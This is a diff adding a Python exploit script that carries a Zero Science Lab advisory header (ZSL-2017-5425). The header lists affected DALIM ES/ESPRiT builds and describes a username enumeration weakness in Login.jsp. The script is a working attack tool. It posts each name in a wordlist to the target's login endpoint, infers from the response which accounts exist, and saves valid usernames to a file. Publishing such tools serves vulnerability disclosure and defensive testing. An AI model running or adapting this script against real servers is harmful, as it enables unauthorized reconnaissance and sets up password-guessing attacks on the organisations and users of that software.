@@ -1,0 +1,127 @@
+#!/usr/bin/env python
+#
+#
+# DALIM SOFTWARE ES Core 5.0 build 7184.1 User Enumeration Weakness
+#
+#
+# Vendor: Dalim Software GmbH
+# Product web page: https://www.dalim.com
+# Affected version: ES/ESPRiT 5.0 (build 7184.1)
+#                                 (build 7163.2)
+#                                 (build 7163.0)
+#                                 (build 7135.0)
+#                                 (build 7114.1)
+#                                 (build 7114.0)
+#                                 (build 7093.1)
+#                                 (build 7093.0)
+#                                 (build 7072.0)
+#                                 (build 7051.3)
+#                                 (build 7051.1)
+#                                 (build 7030.0)
+#                                 (build 7009.0)
+#                                 (build 6347.0)
+#                                 (build 6326.0)
+#                                 (build 6305.1)
+#                                 (build 6235.9)
+#                                 (build 6172.1)
+#                   ES/ESPRiT 4.5 (build 6326.0)
+#                                 (build 6144.2)
+#                                 (build 5180.2)
+#                                 (build 5096.0)
+#                                 (build 4314.3)
+#                                 (build 4314.0)
+#                                 (build 4146.4)
+#                                 (build 3308.3)
+#                   ES/ESPRiT 4.0 (build 4202.0)
+#                                 (build 4132.1)
+#                                 (build 2235.0)
+#                   ES/ESPRiT 3.0
+#
+# Summary: ES is the new Enterprise Solution from DALIM SOFTWARE built
+# from the successful TWIST, DIALOGUE and MISTRAL product lines. The ES
+# Core is the engine that can handle project tracking, JDF device workflow,
+# dynamic user interface building, volume management. Each ES installation
+# will have different features, depending on the license installed: online
+# approval, prepress workflow, project tracking, imposition management...
+#
+# ES is a collaborative digital asset production and management platform,
+# offering services ranging from online approval to web-based production
+# environment for all participants of the production cycle, including brand
+# owners, agencies, publishers, pre-media, printers and multichannel service
+# provider. ES lets users plan, execute and control any aspect of media
+# production, regardless of the final use of the output (print, web, ebook,
+# movie, and others). It ensures productivity and longterm profitability.
+#
+# Desc: The weakness is caused due to the 'Login.jsp' script enumerating
+# the list of valid usernames when some characters are provided via the
+# 'login' parameter.
+#
+# Tested on: Red Hat Enterprise Linux Server release 7.3 (Maipo)
+#            CentOS 7
+#            Apache Tomcat/7.0.78
+#            Apache Tomcat/7.0.67
+#            Apache Tomcat/7.0.42
+#            Apache Tomcat/6.0.35
+#            Apache-Coyote/1.1
+#            Java/1.7.0_80
+#            Java/1.6.0_21
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2017-5425
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5425.php
+#
+#
+# 15.06.2017
+#
+
+
+import argparse
+import requests
+import sys
+
+from colorama import Fore, Back, Style, init
+
+init()
+
+print 'User Enumeration Tool v0.3 for DALiM ES <= v5.0'
+parser = argparse.ArgumentParser()
+parser.add_argument('-t', help='target IP or hostname', action='store', dest='target')
+parser.add_argument('-f', help='username wordlist', action='store', dest='file')
+
+args = parser.parse_args()
+if len(sys.argv) != 5:
+	parser.print_help()
+	sys.exit()
+
+host = args.target
+fn = args.file
+
+try:
+	users = open(args.file, 'r')
+except(IOError):
+	print '[!] Error opening \'' +fn+ '\' file.'
+	sys.exit()
+lines = users.read().splitlines()
+print '[*] Loaded %d usernames for testing.\n' % len(open(fn).readlines())
+users.close()
+results = open('validusers.txt', 'w')
+
+for line in lines:
+	try:
+		r = requests.post("http://" +host+ "/Esprit/public/Login.jsp", data={'actionRole' : 'getRoles', 'login' : line})
+		print '[+] Testing username: ' +Fore.GREEN+line+Fore.RESET
+		testingus = r.text[50:72]
+		if testingus[19:20] != "\"":
+			print '[!] Found ' +Style.BRIGHT+Fore.RED+line+Fore.RESET+Style.RESET_ALL+ ' as valid registered user.'
+			results.write('%s\n' % line)
+	except:
+		print '[!] Error connecting to http://'+host
+		sys.exit()
+
+results.close()
+print '\n[*] Enumeration completed!'
+print '[*] Valid usernames successfully written to \'validusers.txt\' file.\n'
